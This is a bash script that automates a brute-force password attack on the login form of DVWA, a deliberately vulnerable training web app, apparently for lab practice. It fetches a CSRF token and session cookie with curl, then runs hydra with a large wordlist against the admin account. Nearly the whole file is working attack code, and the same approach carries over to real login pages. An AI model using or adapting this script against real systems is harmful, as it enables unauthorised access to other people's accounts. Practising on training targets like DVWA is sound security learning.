#!/bin/bash
display_usage() { 
	echo -e "\nUsage: $0 [host] [port]\n" 
	} 
# if less than two arguments supplied, display usage 
	if [  $# -le 1 ] 
	then 
		display_usage
		exit 1
	fi 
host=$1
port=$2
password="password"
rm dvwa.cookie
rm hydra.restore
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.61 Safari/537.36"
ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
AE="gzip, deflate, br"
AL="en-GB,en-US;q=0.9,en;q=0.8"
REFERER="https://www.google.com/"
CSRF=$(curl -s -H "User-Agent: $UA" -H "ACCEPT: $ACCEPT" -H "ACCEPT-ENCODING: $AE" -H "ACCEPT-LANGUAGE: $AL" -c dvwa.cookie "$host:$port/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
curl -H "User-Agent: $UA" -H "ACCEPT: $ACCEPT" -H "ACCEPT-ENCODING: $AE" -H "ACCEPT-LANGUAGE: $AL" -s -b dvwa.cookie -d "username=admin&password=$password&user_token=${CSRF}&Login=Login" "$host:$port/login.php"
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
hydra  -l admin  -P /usr/share/wordlists/rockyou_modified.txt \
  -e ns  -F  -u -s $port -t 30  -w 2  -v  -V  $host  http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"

